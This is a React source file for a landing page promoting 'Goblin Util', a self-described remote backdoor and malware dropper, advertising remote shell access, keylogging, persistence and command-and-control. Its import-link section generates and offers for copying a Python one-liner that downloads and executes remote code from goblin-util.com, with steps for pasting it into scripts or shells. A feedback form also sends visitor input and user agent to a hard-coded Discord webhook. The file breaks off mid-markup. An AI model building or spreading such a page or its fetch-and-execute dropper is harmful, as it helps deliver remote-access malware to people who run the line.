import React, { useRef, useEffect, useState } from 'react';
import { ChevronLeft, ChevronRight, Volume2, Pause, Play, Terminal, User, Zap, Ghost, Link2, Copy, Shield, Wand2, MessageSquare, X, Info } from 'lucide-react';

const MP3S = [
  {
    url: 'https://r2.e-z.host/6c5f8624-f872-4768-acd5-6ad25ce66f4a/aiphn2hi.mp3',
    title: 'Flex', artist: 'Rich Homie Quan'
  },
  {
    url: 'https://r2.e-z.host/6c5f8624-f872-4768-acd5-6ad25ce66f4a/3ub22yfi.mp3',
    title: 'Demons', artist: 'A$AP Rocky'
  },
  {
    url: 'https://r2.e-z.host/6c5f8624-f872-4768-acd5-6ad25ce66f4a/fabalqqc.mp3',
    title: 'Mason Cafe', artist: 'Larry June'
  }
];

function pickRandom(arr) {
  return Math.floor(Math.random() * arr.length);
}

function NeonMusicWidget({ onAudio, titleCb }) {
  const [playing, setPlaying] = useState(false);
  const [open, setOpen] = useState(false);
  const [track, setTrack] = useState(() => pickRandom(MP3S));
  const [volume, setVolume] = useState(0.95);
  const audioRef = useRef(null);

  useEffect(() => {
    if (typeof titleCb === 'function') titleCb(MP3S[track]);
  }, [track]);

  useEffect(() => {
    if (!audioRef.current) return;
    const audio = audioRef.current;
    audio.volume = volume;
    if (playing) {
      audio.play().catch(error => {
        console.error('Error playing audio:', error);
      });
    } else {
      audio.pause();
    }
  }, [playing, volume, track]);

  const skip = dir => {
    setTrack(t => {
      let next = t + dir;
      if (next < 0) next = MP3S.length - 1;
      if (next >= MP3S.length) next = 0;
      return next;
    });
    setTimeout(() => setPlaying(true), 100);
  };

  return (
    <div className="fixed z-[99990] bottom-6 right-6 pointer-events-auto group select-none">
      <div className={`transition-all duration-400 ${open ? 'scale-100 opacity-95' : 'scale-90 opacity-80'}`}
        style={{
          minWidth: open ? 330 : 54,
          minHeight: open ? 132 : 54,
          borderRadius: 20,
          background: open ? 'linear-gradient(120deg,#181b37eb 70%,#25254d 100%)' : 'rgba(24,27,40,.15)',
          boxShadow: '0 8px 24px #18fff655',
          border: open ? '2px solid #a178ff99' : 'none',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center'
        }}>
        {!open && (
          <button onClick={() => { setOpen(true); setPlaying(true); }}
            className="flex items-center justify-center w-14 h-14 rounded-full shadow-lg bg-gradient-to-tr from-[#18fff6e6] to-[#a178ffeb] border-2 border-[#ffd700d9] hover:scale-110 transition relative"
            aria-label="Open music player"
          >
            {playing ? <Pause size={33} className="text-[#19192e]" /> : <Play size={33} className="text-[#19192e]" />}
            <span className="absolute right-1 top-1 bg-[#282946f5] rounded-md p-1 shadow-lg text-[#ffd700d5] text-[10px] font-bold border border-[#18fff6a2] animate-bounceX">▲</span>
          </button>
        )}
        {open && (
          <>
            <div className="w-full flex items-center gap-2 mb-1 px-2 mt-2" style={{ minHeight: 38 }}>
              <button onClick={() => skip(-1)} aria-label="Previous" className="rounded-md p-2 hover:bg-[#282946b5] transition"><ChevronLeft size={23} /></button>
              <button
                aria-label={playing ? 'Pause' : 'Play'}
                onClick={() => setPlaying(v => !v)}
                className="rounded-full bg-gradient-to-r from-[#18fff6] to-[#a178ff] shadow px-3 py-2 font-black text-[#191a27] text-lg"
              >
                {playing ? <Pause className="inline w-6 h-6" /> : <Play className="inline w-6 h-6" />}
              </button>
              <button onClick={() => skip(+1)} aria-label="Next" className="rounded-md p-2 hover:bg-[#282946b5] transition"><ChevronRight size={23} /></button>
              <span className="flex flex-col items-start ml-2">
                <span className="text-[#a178ff] font-bold text-base leading-none tracking-tight animate-gradient">{MP3S[track].title}</span>
                <span className="text-xs text-[#18fff6d1]">{MP3S[track].artist}</span>
              </span>
            </div>
            <div className="flex items-center gap-2 w-full mb-1 px-5 mt-1">
              <Volume2 className="text-[#ffd700a0] w-5 h-5" />
              <input type="range" min={0} max={1} step={0.01} value={volume}
                onChange={e => setVolume(Number(e.target.value))} className="accent-[#a178ff] w-20" style={{ maxWidth: 72 }} />
            </div>
            <audio src={MP3S[track].url} ref={audioRef} autoPlay={playing} loop preload="auto" />
          </>
        )}
      </div>
    </div>
  );
}

function FeatureGrid() {
  const features = [
    { icon: <Terminal className="text-[#a178ff]" />, title: "Instant Shell", desc: "Get remote terminal access instantly with a single import." },
    { icon: <User className="text-[#18fff6]" />, title: "Personal Links", desc: "Unique import link per device, per-user command and tracking." },
    { icon: <Zap className="text-[#a178ff]" />, title: "Lightning Fast", desc: "Realtime dashboard, live command/control from any browser." },
    { icon: <Ghost className="text-[#18fff6]" />, title: "Encrypted Traffic", desc: "Military-grade encryption and traffic concealment by default." },
    { icon: <Link2 className="text-[#a178ff]" />, title: "Custom Builds", desc: "Build with options: keylogger, persistence, script injection, and more." },
  ];
  const gridRef = useRef(null);
  const [anim, setAnim] = useState(features.map(()=>({pulse:0, bounce:1, rot:0, glow:0, wiggle:0})));
  const [tiltVals, setTiltVals] = useState(features.map(()=>({x:0,y:0})));

  useEffect(() => {
    let raf;
    function animate() {
      raf = requestAnimationFrame(animate);
      setAnim(anim => anim.map((old,i) => {
        const t = performance.now()/1000 + i*0.18;
        const bounce = 1 + 0.14*Math.sin(t*8 + i) * (1-Math.abs(Math.cos(t/0.9))*.5) + 0.10*Math.sin(t*2.2+i*2);
        const rot = Math.sin(t*2 + i*0.8) * 8 + Math.sin(t*4+i*2.6)*2;
        const glow = .47 + .45*Math.abs(Math.sin(t * 2 + i));
        const wiggle = Math.sin(t*15+i*1.7) * 7;
        const pulse = Math.max(0, old.pulse-0.14);
        return {pulse, bounce, rot, glow, wiggle};
      }));
    }
    animate();
    const pulseHandler = ()=>{
      setAnim(anim=>anim.map((a,i)=>({...a,pulse:1})));
    };
    window.addEventListener('goblin-pulse', pulseHandler);
    return () => { cancelAnimationFrame(raf); window.removeEventListener('goblin-pulse', pulseHandler); };
  }, []);
  useEffect(() => {
    function onMouseMove(e) {
      if (!gridRef.current) return;
      const rect = gridRef.current.getBoundingClientRect();
      const cx = rect.left + rect.width / 2, cy = rect.top + rect.height / 2;
      const dx = (e.clientX - cx) / rect.width, dy = (e.clientY - cy) / rect.height;
      setTiltVals(() => features.map((_, i) => ({ x: dx * 7 * (i + 1), y: dy * 8 * (i + 1) })));
    }
    window.addEventListener('mousemove', onMouseMove);
    return () => window.removeEventListener('mousemove', onMouseMove);
  }, []);

  return (
    <section className="w-full flex flex-col items-center py-14 z-10">
      <div className="text-[29px] font-bold mb-8 text-[#a178ff]">Features</div>
      <div ref={gridRef} className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-7 max-w-5xl w-[95vw]">
        {features.map(({ icon, title, desc }, i) => (
          <div key={title}
            style={{
              transform: `translateX(${anim[i].wiggle}px) rotateY(${tiltVals[i].x / 3 + anim[i].rot + anim[i].pulse*3}deg)`+
                        `rotateX(${tiltVals[i].y / 3 + anim[i].rot/2 + anim[i].pulse*3}deg)`+
                        `scale(${anim[i].bounce * (1+anim[i].pulse*0.13)})`,
              boxShadow: `0 0 ${16+anim[i].glow*30 + anim[i].pulse*26}px #18fff6b7, 0 3px 35px #a178ff22`,
              transition: 'transform .23s cubic-bezier(.62,.25,.36,1),box-shadow .11s',
            }}
            className="bg-[#191c33e0] border border-[#28294672] p-7 rounded-xl flex flex-col items-start shadow-md hover:scale-105 transition will-change-transform will-change-shadow"
          >
            <div className="mb-3">{icon}</div>
            <div className="text-xl font-semibold text-[#fff] mb-1">{title}</div>
            <div className="text-base text-[#18fff6a6]">{desc}</div>
          </div>
        ))}
      </div>
    </section>
  );
}

function NoScriptSpotify() {
  return <noscript>
    <div style={{position:'fixed',bottom:20,right:16, zIndex:9999, background:'rgba(24,27,40,0.94)',border:'2px solid #a178ff77',borderRadius:18,padding:14,boxShadow:'0 6px 19px #18fff620'}}>
      <div style={{color:'#18fff6',fontWeight:700,marginBottom:6}}>Music:</div>
      <iframe
        title="Spotify Player"
        src="https://open.spotify.com/embed/track/4T0ScSPdQKmGvruK7pavNP?utm_source=generator"
        width="310" height="60" frameBorder="0" allow="autoplay; clipboard-write; encrypted-media; picture-in-picture"
        style={{borderRadius:10}}
      />
      <div style={{color:'#a178ff',fontSize:13,marginTop:8}}>Enable JavaScript for interactive controls.</div>
    </div>
  </noscript>;
}

function randomGoblinLink() {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let token = Array.from({length: 9}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
  return `https://goblin-util.com/link_${token}`;
}

function AuroraBg() {
  React.useEffect(() => {
    const canvas = document.getElementById('aurora-bg');
    if (!canvas) return;
    let raf;
    const ctx = canvas.getContext('2d');
    function draw() {
      const w = canvas.width = window.innerWidth;
      const h = canvas.height = window.innerHeight;
      ctx.clearRect(0, 0, w, h);
      for (let i = 0; i < 7; i++) {
        ctx.save();
        ctx.beginPath();
        let grad = ctx.createLinearGradient(0, 0, w, h);
        grad.addColorStop(0, `hsla(${160+40*i},90%,60%,.19)`);
        grad.addColorStop(1, `hsla(${160+40*i},95%,70%,0)`);
        ctx.fillStyle = grad;
        ctx.arc(
          w/2 + Math.sin(Date.now()/2000 + i)*w/2.2,
          h/2 + Math.cos(Date.now()/1600 + i)*h/2.2,
          220 + 70*Math.sin(Date.now()/960 + i*5),
          0, Math.PI*2);
        ctx.fill();
        ctx.restore();
      }
      raf = requestAnimationFrame(draw);
    }
    draw();
    return () => cancelAnimationFrame(raf);
  }, []);
  return <canvas id="aurora-bg" style={{position:'fixed',zIndex:0,top:0,left:0,width:'100vw',height:'100vh',pointerEvents:'none',opacity:0.19}} />;
}

function BitcoinLoader({done}) {
  return (
    <div
      className={`fixed inset-0 flex items-center justify-center z-[9999] transition-opacity duration-700 bg-[linear-gradient(135deg,#16171a_60%,#282946_100%)] ${done ? 'opacity-0 pointer-events-none':'opacity-100'}`}
      style={{backdropFilter:'blur(2.5px)'}}
    >
      <svg style={{width:90,height:90, filter:'drop-shadow(0 0 22px #fac901cc) drop-shadow(0 0 36px #ffe87388)'}} viewBox="0 0 64 64" fill="none" className="animate-spin-fast">
        <ellipse cx="32" cy="32" rx="32" ry="32" fill="#ffd700" />
        <path d="M43 32c0 6.075-4.925 11-11 11s-11-4.925-11-11 4.925-11 11-11 11 4.925 11 11zm-17.415 0A6.415 6.415 0 1032 25.585 6.422 6.422 0 0025.585 32z" fill="#f7931a" />
        <path d="M33.57 25.61a4.205 4.205 0 0 0-2.77-.57v1.604a3.264 3.264 0 0 1 2.2.457 1.165 1.165 0 0 1 .529.986c0 .234-.062.445-.185.629a1.098 1.098 0 0 1-.516.385 5.598 5.598 0 0 1-1.799.172l-.205.008v2.355l.094-.002c.88-.013 1.498-.046 1.85-.098a2.2 2.2 0 0 0 1.017-.267 1.515 1.515 0 0 0 .604-.57 1.401 1.401 0 0 0 .184-.68c0-.43-.157-.792-.47-1.076a1.395 1.395 0 0 0-.81-.332zm-2.218 7.176v-1.707a3.913 3.913 0 0 0-2.151-.656 1.276 1.276 0 0 1-.506-1.013c0-.238.06-.45.18-.634.12-.184.26-.307.418-.367a5.703 5.703 0 0 1 1.977-.207v-2.197l-.213.007c-.74.024-1.326.091-1.757.197a2.073 2.073 0 0 0-.822.437c-.207.185-.363.386-.466.601a1.267 1.267 0 0 0-.135.568c0 .145.032.287.098.427.066.14.178.273.336.397a4.16 4.16 0 0 0 1.591.54zm1.297 2.303v-1.396a4.074 4.074 0 0 0 2.573-.684 2.174 2.174 0 0 0 .88-.981c.227-.422.34-.9.34-1.44a2.846 2.846 0 0 0-1.13-2.238 3.388 3.388 0 0 0-2.336-.833V20.86h-1.232v1.318c-1.056.085-2.013.415-2.797.969a2.58 2.58 0 0 0-1.062 1.676c-.163.637-.244 1.354-.244 2.144 0 1.165.151 2.074.45 2.737.3.663.793 1.19 1.5a4.852 4.852 0 0 0 2.532.422v1.38h1.232z" fill="#fff" />
      </svg>
      <style>{`.animate-spin-fast{animation:spin 1.35s linear infinite}`}</style>
    </div>
  );
}

function Hero() {
  return (
    <section className="w-full min-h-[82vh] flex flex-col items-center justify-center relative z-10 ">
      <div className="mt-12 mb-3 flex flex-col items-center justify-center ">
        <div className="text-[60px] md:text-[92px] mb-2 font-black goblin-glow ">
          <span className="inline-block animate-spin-slow text-[#18fff6] drop-shadow-[0_0_49px_#1affe675]">
            <Shield className="inline mx-1" size={54} />
          </span>
          <span className="ml-2 tracking-tight text-transparent bg-clip-text bg-gradient-to-r from-[#18fff6] via-[#a178ff] to-[#22f7e7] animate-gradient">Goblin Util<span className="ml-2 text-xl align-middle inline-block text-[#ffd700b8]">*</span></span>
        </div>
        <div className="text-xl md:text-2xl tracking-tight font-semibold text-[#a178ff] drop-shadow-glow mb-1 text-center">
          Your All-in-One <span className="line-through">Totally Legitimate Utility</span> Remote Backdoor
        </div>
        <div className="text-base text-[#18fff6b7] italic font-mono mb-4 text-center max-w-lg mx-auto">
          A new era of remote administration and ~productivity~ <span className="line-through">malware operations</span>. Import, connect, control—instantly, with neon magic.<br />
          <span className='font-bold text-[#a178ff]'>Under Development – Launching 2025</span><br />
          <span className="text-xs text-[#ffd700b5] mt-1 block">*Definitely a utility. For sure.</span>
        </div>
      </div>
    </section>
  )
}

function ImportLinkHighlight({visible}) {
  const ref = useRef(null);

  useEffect(() => {
    if (visible && ref.current) {
      ref.current.style.opacity = '1';
      ref.current.style.transform = 'translateY(0px)';
    }
  }, [visible]);

  const [copied, setCopied] = useState(false);
  const [generated, setGenerated] = useState(false);
  const [fakeUrl, setFakeUrl] = useState('');
  const [showGuide, setShowGuide] = useState(false);
  const [genLoading, setGenLoading] = useState(false);

  const generate = () => {
    setGenLoading(true);
    setCopied(false);
    setTimeout(() => {
      setFakeUrl(randomGoblinLink());
      setGenerated(true);
      setGenLoading(false);
      setShowGuide(true);
    }, 1200 + Math.random()*800);
  };
  const importSnippet = fakeUrl
    ? `from urllib.request import urlopen\nexec(urlopen('${fakeUrl}').read())`
    : `from urllib.request import urlopen\nexec(urlopen('<your-goblin-link-here>').read())`;

  return (
    <section id="import-link" className="relative flex flex-col items-center justify-center w-full z-10">
      <div
        ref={ref}
        style={{
          opacity: visible ? 1 : 0,
          transform: visible ? 'translateY(0px)' : 'translateY(50px)',
          transition: 'opacity 0.7s cubic-bezier(.42,2.2,.44,1.07), transform 0.85s cubic-bezier(.42,2.2,.44,1.07)',
          pointerEvents: visible ? 'auto' : 'none'
        }}
        className="bg-[#181a33d9] border-2 border-[#18fff6cc] shadow-xl rounded-3xl px-7 py-11 flex flex-col items-center max-w-xl w-[90vw] animate-fadeIn relative overflow-hidden mt-1"
      >
        <div className="flex items-center gap-2 mb-1">
          <Wand2 className="text-[#18fff6] animate-wiggle" size={31}/>
          <span className="uppercase text-[22px] tracking-tight font-extrabold text-[#18fff6]">Instant Import Link</span>
          <span className="ml-3 text-[13px] uppercase text-[#ffd700b9] font-black animate-opacityPing ">Encrypted · One-line Stealth</span>
        </div>
        <div className="text-lg text-[#a178ff] font-mono mt-2 text-center">Deploy remote utilities with a single <span className="font-bold">import</span>. No download. No trace. Full control, instantly.</div>
        <div className="relative w-full mt-6 min-h-[68px]">
          {genLoading ? (
            <div className="w-full flex items-center justify-center py-8">
              <svg viewBox="0 0 64 64" width="33" height="33" className="animate-spin-fast">
                <circle cx="32" cy="32" r="23" stroke="#18fff6" strokeWidth="3.5" fill="none" opacity="0.2"/>
                <path d="M32 11a21 21 0 1 1-21 21" stroke="#18fff6" strokeWidth="5.5" strokeLinecap="round" fill="none"/>
              </svg>
              <span className="ml-6 text-[#18fff6] font-extrabold tracking-widest text-lg animate-pulse">Generating...</span>
            </div>
          ) : (
            <pre className={`bg-[#111623] rounded-xl text-[#18fff6] font-mono text-[1.12em] py-4 px-2 mt-0 shadow-md select-all text-center overflow-x-auto transition-[box-shadow] duration-500 group border-2 ${(generated&&!genLoading)?'border-[#18fff6] animate-blink-glow pulse-border':''}`} style={{letterSpacing:'.01em', minHeight:38}}>
              {importSnippet}
            </pre>
          )}
          {!genLoading && <button
            className="absolute right-5 top-1/2 -translate-y-1/2 bg-[#18fff6] hover:bg-[#a178ff] text-gray-900 font-bold p-2 rounded-full shadow-lg focus:outline-none transition flex items-center"
            onClick={() => {
              navigator.clipboard.writeText(importSnippet);
              setCopied(true);
              setTimeout(()=>setCopied(false), 1150);
            }}
            aria-label="Copy import link"
          >
            <Copy className="w-5 h-5" />
          </button>}
        </div>
        <div className="flex gap-4 mt-7">
          <button
            className="px-7 py-2 rounded-xl bg-gradient-to-r from-[#a178ff] to-[#18fff6] text-[#181c2c] font-black shadow-lg hover:scale-105 focus:outline-none transition border-2 border-[#18fff6bb] animate-bounceX"
            onClick={generate} disabled={genLoading}
          >
            <Wand2 className="inline-block mr-2 -mt-1 animate-pulse" size={21} />
            {genLoading ? 'Generating...' : (generated ? 'Regenerate' : 'Generate Link')}
          </button>
          <button
            className="px-7 py-2 rounded-xl border-2 border-[#a178ff90] text-[#a178ff] font-black bg-[#141b2abb] shadow hover:bg-[#181d3390] transition"
            onClick={() => setShowGuide(v => !v)}
          >
            Usage Guide
          </button>
        </div>
        <div className="text-base font-semibold mt-5 text-[#ffd700] px-2 text-center flex flex-col gap-1">
          {copied
            ? (<span className='text-[#a178ff] animate-popIn'>Copied!</span>)
            : (<span>{generated? 'Your remote utility, one import away.' : 'Click Generate Link to see your unique one-liner.'}</span>)}
        </div>
        {showGuide && (
        <div className="mt-7 animate-fadeIn relative text-left bg-[#161821f6] rounded-xl px-7 py-7 border-2 border-[#18fff688] max-w-lg w-full shadow-lg flex flex-row gap-4 items-start">
          <div className="mt-2"><Info className="w-8 h-8 text-[#18fff6] animate-wiggle" /></div>
          <div>
            <div className="text-[#18fff6] text-[1.2em] font-bold mb-2 flex items-center gap-2">Usage Guide <span className="bg-[#18fff6e1] px-3 py-1 rounded-full text-[#191a2c] text-xs ml-3 font-bold animate-opacityPing">Coming Soon</span></div>
            <ol className="list-decimal ml-5 text-[#e0f2ff] text-base font-mono mb-3">
              <li className="mb-2"><span className="inline-block mr-2 text-[#18fff6] font-bold">1.</span>Paste the one-liner<br />in your <b>Python (.py) file</b>.</li>
              <li className="mb-2"><span className="inline-block mr-2 text-[#18fff6] font-bold">2.</span>OR run it in<br /><b>Python shell, CMD, or PowerShell</b>.</li>
              <li className="mb-2"><span className="inline-block mr-2 text-[#18fff6] font-bold">3.</span>No install. No module.<br /><span className="text-[#ffd700] font-bold">Works instantly.</span></li>
            </ol>
            <div className="mt-3 text-[#ffd700] font-semibold">Currently in active development.<br /><span className="text-base text-[#a178ff]">Launching 2025</span></div>
          </div>
        </div>
        )}
      </div>
    </section>
  );
}

function DashboardPreview() {
  const GIF_URL = 'https://r2.e-z.host/6c5f8624-f872-4768-acd5-6ad25ce66f4a/uwj80iyk.gif';
  return (
    <section className="flex flex-col items-center py-16 w-full z-10">
      <div className="text-[25px] text-[#18fff6d0] mb-7 font-bold">Dashboard Sneak Peek</div>
      <div className="bg-[#181a29e0] border-2 border-[#a178ff90] rounded-2xl p-8 shadow-2xl max-w-2xl flex flex-col items-center w-full">
        <img src={GIF_URL} alt="dashboard gif preview" className="w-full max-w-lg rounded-2xl shadow-xl border-[3px] border-[#18fff6] animate-pulse-slow"/>
        <div className="mt-5 text-[#a178ff] text-lg text-center max-w-xl">All your remote utilities in one dashboard: clients, commands, status, and more. Fully animated, pure neon energy.</div>
      </div>
    </section>
  )
}

function TelegramCTA() {
  return (
    <section className="flex flex-col items-center justify-center py-16 bg-gradient-to-t from-[#1b222e00] to-[#14141c1a] w-full relative z-10">
      <div className="text-2xl font-bold mb-4 text-[#18fff6]">Contact & Updates</div>
      <div className="mb-4 text-lg text-[#a178ff]">Goblin Util is currently <b>under development</b>. <br />Join Telegram for news, public launch, and requests.</div>
      <a href="https://t.me/GoblinCrew" target="_blank" rel="noopener noreferrer"
        className="inline-flex items-center gap-3 px-8 py-4 rounded-full bg-gradient-to-tr from-[#18fff6] to-[#a178ff] font-bold text-[#181b2d] text-lg shadow-2xl border-4 border-[#ffd700] animate-bounceX transition-all focus:ring-4 ring-[#18fff6] hover:scale-105 hover:shadow-teleRing relative group"
        style={{overflow:'hidden'}}
        onMouseEnter={e=>{
          e.currentTarget.classList.add('animate-pulse-tg-ring');
        }}
        onAnimationEnd={e=>{
          e.currentTarget.classList.remove('animate-pulse-tg-ring');
        }}
      >
        <span className="relative inline-block">
          <svg width="30" height="30" viewBox="0 0 50 50" fill="none"><circle cx="25" cy="25" r="25" fill="#229ED9"/><path d="M38.5 13.708c.417-1.792-1.042-2.625-2.833-2.083L9.333 20.042c-1.75.583-1.75 1.458-.313 1.833l5.667 1.75 2.083 6.375c.25.666.458.917 1.208.917.792 0 1.146-.333 1.562-.75L22 28.208l4.583 3.333c.833.458 1.438.22 1.625-.771l3-14.333z" fill="#fff"/></svg>
          <span className="absolute -top-2 -right-5 w-[16px] h-[16px] bg-[#fff35b] rounded-full animate-telePop" />
        </span>
        <span className="pl-1">@GoblinCrew <span className="text-[#181b2d] text-base font-bold">→</span></span>
      </a>
      <div className="mt-6 text-xs text-[#18fff6a7] text-center">This is the official social for project updates and launch notifications.<br/>No release yet.</div>
      <style>{`.animate-pulse-tg-ring{box-shadow:0 0 0 8px #ffd700b1,0 0 0 16px #18fff6a1 !important;}
        .animate-telePop{animation:bouncePop .7s cubic-bezier(.59,.03,.17,1.7) infinite alternate;}
        @keyframes bouncePop{from{transform:scale(.8);}to{transform:scale(1.22);}}
        .shadow-teleRing{box-shadow:0 0 16px #18fff699,0 6px 44px #a178ff66;}
      `}</style>
    </section>
  );
}

function FeedbackModal({open, onClose}) {
  const [sent, setSent] = useState(false);
  const [sending, setSending] = useState(false);
  const [feature, setFeature] = useState('');
  const [vibe, setVibe] = useState('');
  const [error, setError] = useState('');

const sendFeedback = async (choice) => {
  setSending(true);
  setError('');
  setVibe(choice);
  try {
    await fetch('https://discord.com/api/webhooks/1370984700042022922/7XedtwZotVM7PlWn1rBuhZDrpe3v0O3cjq-EEevc2Cyx9rRbobfsPmUUapY0uIxdoPce', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `New feedback received: ${choice}`,
        embeds: [{
          title: 'Feature Feedback',
          description: `**Choice:** ${choice}\n**Feature Request:** ${feature}\n**User Agent:** ${window.navigator.userAgent}`,
          color: 0x18fff6,
          timestamp: new Date().toISOString()
        }]
      })
    });
  } catch (e) {
    setError('Feedback could not be sent, but thanks!');
  }
  setSent(true);
  setSending(false);
};

  if (!open) return null;
  return (
    <div className="fixed inset-0 z-[99999] flex items-center justify-center bg-[#1b1d32e7] backdrop-blur-sm transition-all animate-fadeIn">
      <div className="bg-[#191a33f6] border-2 border-[#a178ff99] rounded-2xl shadow-xl py-9 px-7 max-w-md w-[94vw] relative animate-smoothIn">
        <button onClick={onClose} className="absolute top-3 right-3 rounded-md hover:bg-[#28294633] p-2 text-[#a178ff] focus:outline-none"><X className="w-6 h-6" /></button>
        {!sent?
          <>
            <div className="text-2xl font-bold text-[#18fff6] mb-2 text-center">Your Opinion Matters</div>
            <div className="text-[#a178ff] mb-4 text-center">
              Goblin Util is <b>UNDER DEVELOPMENT</b>.<br/>
              Would you use or buy this when it launches?<br/>
              <span className="block mt-2 text-sm text-[#ffd700bb] italic">It's definitely <span className="line-through">not</span> malware. We pinky swear!</span>
            </div>
            <div className="flex justify-center gap-4 mb-2">
              <button type="button" disabled={sending} onClick={()=>sendFeedback('Yes')} className="bg-gradient-to-tr from-[#18fff6] to-[#a178ff] px-7 py-2 rounded-full font-bold text-[#181c2c] shadow-lg hover:scale-105 transition-all">Yes</button>
              <button type="button" disabled={sending} onClick={()=>sendFeedback('Maybe')} className="bg-gradient-to-tr from-[#a178ff] to-[#18fff6] px-7 py-2 rounded-full font-bold text-[#181c2c] shadow-lg hover:scale-105 transition-all">Maybe</button>
              <button type="button" disabled={sending} onClick={()=>sendFeedback('No')} className="bg-[#181d29] border-2 border-[#a178ffbb] text-[#a178ff] px-7 py-2 rounded-full font-bold shadow-lg hover:scale-105 transition-all">No</button>
            </div>
            <div className="bg-[#16171c] border border-[#18fff699] rounded-xl mt-4 px-4 py-3 flex items-center gap-2">
              <span className="text-[#ffd700d6] font-bold mr-2">+</span>
              <span className="text-base text-[#18fff6] font-semibold">What features should we focus on or add?</span>
            </div>
            <textarea value={feature} onChange={e=>setFeature(e.target.value)} placeholder="(Optional) Feature requests, ideas, or meme feedback..." className="block w-full mt-4 px-3 py-2 bg-[#161925] border border-[#18fff688] rounded-md text-[#18fff6] font-mono text-base transition-all" maxLength={300} rows={3}/>
            <div className="text-xs text-[#a178ffab] mt-2 text-center">Actually a <span className="line-through">remote productivity utility</span> hobby malware dropper. Probably not legal in your country. 😉</div>
            {!!error && <div className="text-xs mt-2 text-[#ff8888] text-center">{error}</div>}
          </>
        :
        <div className="flex flex-col items-center justify-center animate-fadeIn">
          <div className="text-3xl font-bold text-[#18fff6] mb-4 animate-glow" style={{textShadow:'0 0 22px #18fff6aa'}}>Thank you! <span role="img" aria-label="thanks">🙏</span></div>
          <div className="text-[#a178ff] mb-4 text-center">We appreciate your feedback.<br/>anyone could ignore this entirely.<br/>See you at launch (if we’re not banned yet)!</div>
          <button onClick={onClose} className="w-full mt-2 px-3 py-2 rounded-xl bg-gradient-to-r from-[#18fff6] to-[#a178ff] text-[#181c22] font-bold shadow-lg hover:scale-105">Close</button>
        </div>
        }
      </div>
      <style>{`
        .animate-smoothIn {animation:smoothIn .8s cubic-bezier(.49,0,.33,1.18);}
        @keyframes smoothIn {from{opacity:0;transform:translateY(60px) scale(.90);}to{opacity:1;transform:none;}}
        .animate-glow{animation:glowFade 1.5s infinite alternate;}
        @keyframes glowFade{from{text-shadow:0 0 18px #a178ff88;}to{text-shadow:0 0 29px #18fff6cc;}}
      `}</style>
    </div>
  );
}

function Footer() {
  return (
    <footer className="py-12 flex flex-col items-center justify-center text-[#a178ffb6] text-lg">
      <span className="font-bold">🦠 Goblin Util · Under Development · Launching 2025</span>
    </footer>
  );
}

export default function App() {
  const [loading, setLoading] = useState(true);
  const [showImport, setShowImport] = useState(false);
  const [showFeedback, setShowFeedback] = useState(false);
  const importRef = useRef(null);

  useEffect(() => {
    const t = setTimeout(() => setLoading(false), 2100);
    return () => clearTimeout(t);
  }, []);
  useEffect(() => {
    const style = document.createElement('style');
    style.innerHTML = `
      @keyframes blink-glow { 0%,100%{box-shadow:0 0 0 #18fff600;}40%{box-shadow:0 0 21px #18fff6;} }
      .animate-blink-glow { animation: blink-glow 1.3s 1; }
      @keyframes popIn { 0%{transform:scale(.3);opacity:0;} 60%{transform:scale(1.23);} 100%{transform:none;opacity:1;} }
      .animate-popIn {animation:popIn 0.69s;}
      .animate-gradient {background-size:200% 200%;animation:gradientMove 3.8s linear infinite alternate;}
      @keyframes gradientMove {from{background-position:0% 70%;}to{background-position:100% 50%;}}
      .goblin-glow { text-shadow:0 0 40px #18fff6cc, 0 2px 29px #a178ff88; }
      .drop-shadow-glow { filter:drop-shadow(0 0 10px #18fff6a7); }
      .shadow-btn { box-shadow:0 8px 32px #18fff6b8, 0 2px 13px #a178ff44; }
      .animate-spin-slow { animation:spin 5s linear infinite; }
      .animate-spin-fast { animation:spin 1.35s linear infinite; }
      @keyframes spin { from{transform:rotate(0);}to{transform:rotate(360deg);} }
      .animate-wiggle { animation:wiggle .66s linear infinite alternate; }
      @keyframes wiggle { from{transform:rotate(-8deg);} to{transform:rotate(8deg);} }
      .animate-pulse-slow { animation:pulse 3.3s infinite alternate; }
      @keyframes pulse { from{filter:brightness(.86) blur(0px);} to{filter:brightness(1.18) blur(1px);} }
      .animate-fadeIn { animation:fadeIn 0.7s cubic-bezier(.42,2.2,.44,1.07);}
      @keyframes fadeIn { from{opacity:0;transform:translateY(10px);} to{opacity:1;transform:none;}}
      .animate-flash-blit{animation:flashBlit 2s 1;}
      @keyframes flashBlit {0%{opacity:0;}30%{opacity:1;} 60%{opacity:0;} 100%{opacity:0}}
      .animate-bounceX { animation:bounceX 1.1s 1;}
      @keyframes bounceX{0%{transform:scale(.98);}50%{transform:scale(1.12);}100%{transform:none}}
      .animate-opacityPing { animation:opacityPing 2.3s infinite alternate; }
      @keyframes opacityPing {from{opacity:.68;}to{opacity:1;}}
      .pulse-border { box-shadow:0 0 29px #ffd70070 !important; }
    `;
    document.head.appendChild(style);
    return () => style.remove();
  }, []);

  function handleSeeImportLink(e) {
    e.preventDefault();
    setShowImport(true);
    setTimeout(() => {
      const block = document.getElementById('import-link');
      if (block) block.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }, 220);
  }

  return (
    <div className="relative min-h-screen flex flex-col items-center justify-center bg-[linear-gradient(132deg,#181255_80%,#22f7e7_100%)]" style={{overflow:'hidden'}}>
      <BitcoinLoader done={!loading} />
      <AuroraBg />
      <NoScriptSpotify />
      <NeonMusicWidget />
      <div className={`relative z-10 w-full transition-opacity duration-700 ${loading?'opacity-0 pointer-events-none':'opacity-100'}`}>
        <Hero />
        <div className="flex justify-center mt-6">
          <a
            href="#import-link"
            className="mt-3 px-10 py-4 rounded-2xl bg-gradient-to-r from-[#18fff6] to-[#a178ff] font-extrabold text-[#181b21] text-lg shadow-btn border-4 border-[#ffd700] animate-bounceX transition-all hover:scale-105 focus:ring-4 ring-[#18fff6]"
            onClick={handleSeeImportLink}
          >
            See Instant Import Link
          </a>
        </div>
        <ImportLinkHighlight visible={!!showImport} />
        <FeatureGrid />
        <DashboardPreview />
        <TelegramCTA />
        <div className="flex justify-center mt-12 mb-8">
